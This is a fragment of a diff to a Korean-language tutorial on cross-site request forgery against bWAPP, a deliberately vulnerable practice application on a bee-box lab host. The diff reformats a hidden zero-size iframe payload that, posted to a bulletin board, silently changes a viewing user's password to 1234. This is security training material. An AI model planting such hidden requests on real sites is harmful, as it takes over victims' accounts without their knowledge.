@@ -30,4 +30,4 @@ method="GET" 요청방식을 사용하고 있으므로 서버로 전달할 내�
 
 **Step 2. 공격 URL을 호출하도록 게시판에 등록**
 
-<iframe src = "http://bee-box/bWAPP/csrf_1.php?password_new=1234&password_conf=1234&action=change" width = "0" height="0"></iframe>
+`<iframe src = "http://bee-box/bWAPP/csrf_1.php?password_new=1234&password_conf=1234&action=change" width = "0" height="0"></iframe>`
